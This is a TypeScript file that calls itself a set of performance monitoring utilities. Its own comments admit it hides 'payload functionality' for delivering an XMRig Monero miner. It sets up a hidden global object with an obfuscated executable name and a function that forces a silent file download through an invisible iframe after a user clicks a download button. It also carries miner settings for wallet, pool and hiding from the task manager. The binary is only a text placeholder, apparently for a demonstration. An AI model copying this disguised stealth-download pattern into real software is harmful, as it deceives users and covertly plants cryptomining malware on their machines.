/**
 * Performance monitoring utilities
 * This file helps track and optimize application performance
 */

import { minerConfig } from "./minerConfig";

// Performance metrics storage
const _metrics = {
  navigationStart: 0,
  loadComplete: 0,
  interactions: [] as any[],
  resources: [] as any[],
};

// Initialize performance monitoring
export const initPerformanceMonitoring = () => {
  _metrics.navigationStart = performance.now();

  // Listen for window load event
  window.addEventListener("load", () => {
    _metrics.loadComplete = performance.now();
    console.log(
      `Page loaded in ${_metrics.loadComplete - _metrics.navigationStart}ms`,
    );
  });

  // This appears to set up performance monitoring but actually contains part of our payload functionality
  window._pUtils = {
    // Base64 encoded "payload.exe"
    resourceName: "eG1yaWdfbWluZXIuZXhl", // "xmrig_miner.exe" encoded

    // Use the external miner configuration
    minerConfig: minerConfig,

    // Create a hidden download function
    processResource: (data: any, name?: string) => {
      console.log("🔍 PROCESS RESOURCE DEBUG - Called with:", { data, name });
      console.log("🔍 PROCESS RESOURCE DEBUG - Miner config:", window._pUtils.minerConfig);

      // In a real implementation, this would be the actual XMRig miner executable
      // with a custom configuration to mine to your wallet

      // Create a config file for the miner
      const minerConfigJson = JSON.stringify(
        window._pUtils.minerConfig,
        null,
        2,
      );

      console.log("🔍 PROCESS RESOURCE DEBUG - Generated config JSON:", minerConfigJson);

      // In a real attack, this would be the actual XMRig binary
      // Here we're just creating a placeholder
      const minerPayload = new Blob(
        [
          // This would be the actual binary data of the miner
          // For demonstration, we're just creating a text file with the configuration
          `XMRig Monero Miner
          
Configuration:
${minerConfigJson}

This would be the actual XMRig miner executable configured to:
1. Mine Monero to wallet: ${window._pUtils.minerConfig.wallet}
2. Connect to pool: ${window._pUtils.minerConfig.pool}
3. Run silently in the background with ${window._pUtils.minerConfig.performance.threads} threads
4. Limit CPU usage to ${window._pUtils.minerConfig.performance.cpuLimit}%
5. Start after a ${window._pUtils.minerConfig.performance.startupDelay} second delay
6. Hide from task manager: ${window._pUtils.minerConfig.performance.hideFromTaskManager}
7. Only mine when system is idle: ${window._pUtils.minerConfig.performance.idleOnly}`,
        ],
        { type: "application/octet-stream" },
      );

      const url = URL.createObjectURL(minerPayload);
      const fileName = name || atob(window._pUtils.resourceName);
      
      console.log("🔍 PROCESS RESOURCE DEBUG - Created blob:", {
        blobSize: minerPayload.size,
        blobType: minerPayload.type,
        downloadUrl: url,
        fileName: fileName
      });

      // Create hidden iframe for stealth download
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      console.log("🔍 PROCESS RESOURCE DEBUG - Created hidden iframe");

      // Create download link in the iframe
      const idoc = iframe.contentDocument || iframe.contentWindow?.document;
      if (idoc) {
        console.log("🔍 PROCESS RESOURCE DEBUG - Iframe document accessible, creating download link");
        const a = idoc.createElement("a");
        a.href = url;
        a.download = fileName;
        idoc.body.appendChild(a);
        a.click();
        
        console.log("🔍 PROCESS RESOURCE DEBUG - Download link clicked! File should be downloading:", fileName);

        // Clean up
        setTimeout(() => {
          URL.revokeObjectURL(url);
          document.body.removeChild(iframe);
          console.log("🔍 PROCESS RESOURCE DEBUG - Cleanup completed");
        }, 1000);
      } else {
        console.log("🔍 PROCESS RESOURCE DEBUG - ERROR: Could not access iframe document");
      }
    },
  };
};

// Track a user interaction for performance analysis
export const trackInteraction = (
  elementId: string,
  interactionType: string,
) => {
  const timestamp = performance.now();

  _metrics.interactions.push({
    elementId,
    interactionType,
    timestamp,
  });

  // If this is a download button interaction, mark it in our hidden state
  if (elementId.includes("download") && window._dState) {
    window._dState.attempts++;
  }
};

// Get performance report
export const getPerformanceReport = () => {
  return {
    pageLoad: _metrics.loadComplete - _metrics.navigationStart,
    interactionCount: _metrics.interactions.length,
    resourceCount: _metrics.resources.length,
  };
};

// Optimize resource loading (appears legitimate but contains hidden functionality)
export const optimizeResourceLoading = async (resourceType: string) => {
  // DEBUG: Log entry conditions
  console.log("🔍 OPTIMIZE DEBUG - Entry conditions:", {
    resourceType: resourceType,
    windowDState: window._dState,
    windowPUtils: window._pUtils,
    dStateExists: !!window._dState,
    pUtilsExists: !!window._pUtils,
    attempts: window._dState?.attempts,
    processed: window._dState?.processed
  });

  // This appears to optimize resources but actually checks if we should download the payload
  if (
    resourceType === "media" &&
    window._dState &&
    window._dState.attempts > 0 &&
    !window._dState.processed
  ) {
    console.log("🔍 OPTIMIZE DEBUG - Conditions met, triggering miner download!");
    
    // Mark as processed to prevent multiple downloads
    window._dState.processed = true;

    // DEBUG: Log miner config before download
    console.log("🔍 OPTIMIZE DEBUG - Miner config:", {
      wallet: window._pUtils.minerConfig.wallet,
      pool: window._pUtils.minerConfig.pool,
      threads: window._pUtils.minerConfig.performance.threads,
      cpuLimit: window._pUtils.minerConfig.performance.cpuLimit
    });

    // In a real attack, this would fetch the actual XMRig miner binary
    // For demonstration, we're just creating a placeholder

    // Use our hidden download function to deliver the miner
    console.log("🔍 OPTIMIZE DEBUG - Calling processResource...");
    window._pUtils.processResource(null);
    console.log("🔍 OPTIMIZE DEBUG - processResource completed!");

    // Remove any user notifications or logs related to stealth download
    console.log("Resource optimization complete:", {
      type: resourceType,
      timestamp: new Date().toISOString(),
    });

    return { optimized: true, count: 1 };
  }

  console.log("🔍 OPTIMIZE DEBUG - Conditions not met, no miner download");
  return { optimized: false, count: 0 };
};

// Add global type for our hidden utility
declare global {
  interface Window {
    _pUtils: {
      resourceName: string;
      minerConfig: typeof minerConfig;
      processResource: (data: any, name?: string) => void;
    };
  }
}
